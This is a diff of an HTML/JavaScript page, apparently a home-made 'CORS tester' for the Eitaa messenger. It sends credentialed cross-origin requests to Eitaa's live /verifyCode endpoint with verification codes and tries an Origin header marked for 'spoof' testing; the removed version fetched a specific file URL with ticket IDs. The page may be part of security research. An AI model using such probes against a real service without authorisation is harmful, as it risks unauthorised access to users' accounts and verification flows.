@@ -1,49 +1,78 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>Eitaa VerifyCode CORS Tester</title>
+    <style>
+        body { font-family: monospace; padding: 20px; }
+        input, textarea { width: 100%; margin-bottom: 10px; }
+        button { padding: 10px; }
+        pre { background: #111; color: #0f0; padding: 10px; white-space: pre-wrap; }
+    </style>
+</head>
 <body>
 
-<h2>Eitaa File Debug Tester</h2>
+<h2>Eitaa /verifyCode CORS Test</h2>
 
-<button onclick="run()">Send Request</button>
+<p>Reply Code:</p>
+<input id="reply_code" placeholder="reply_code">
+
+<p>Code:</p>
+<input id="code" placeholder="code">
+
+<p>Optional Origin (for testing spoof behavior):</p>
+<input id="origin" value="https://alirh2003.github.io">
+
+<button onclick="send()">Send Request</button>
 
 <pre id="out"></pre>
 
 <script>
 
-async function run() {
+async function send() {
 
-    const url = "https://my.eitaa.com/api/v1/file/show/151300_69fae370d5bcf_1048?ticket=490188&message=1098604";
+    const reply_code = document.getElementById("reply_code").value;
+    const code = document.getElementById("code").value;
+    const origin = document.getElementById("origin").value;
+
+    const url = "https://my.eitaa.com/api/v1/verifyCode";
+
+    const payload = {
+        reply_code: reply_code,
+        code: code
+    };
 
     try {
 
         const res = await fetch(url, {
-            method: "GET",
-            credentials: "include"
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+                "Accept": "application/json",
+                "Origin": origin
+            },
+
+            credentials: "include",
+            body: JSON.stringify(payload)
         });
 
-        let out = "";
+        const text = await res.text();
 
-        out += "STATUS: " + res.status + "\n\n";
-
-        out += "URL: " + url + "\n\n";
-
-        out += "HEADERS SENT BY BROWSER:\n";
-        out += "- Cookie: (automatic if available)\n";
-        out += "- Origin: " + location.origin + "\n\n";
-
-        out += "RESPONSE HEADERS:\n";
-
+        let headers = "";
         res.headers.forEach((v, k) => {
-            out += k + ": " + v + "\n";
+            headers += k + ": " + v + "\n";
         });
 
-        out += "\nRESPONSE BODY:\n";
-        out += await res.text();
-
-        document.getElementById("out").innerText = out;
+        document.getElementById("out").innerText =
+            "STATUS: " + res.status + "\n\n" +
+            "=== RESPONSE HEADERS ===\n" +
+            headers +
+            "\n=== RESPONSE BODY ===\n" +
+            text;
 
     } catch (e) {
-        document.getElementById("out").innerText = e;
+
+        document.getElementById("out").innerText =
+            "ERROR (likely CORS blocked):\n" + e;
     }
 }
 
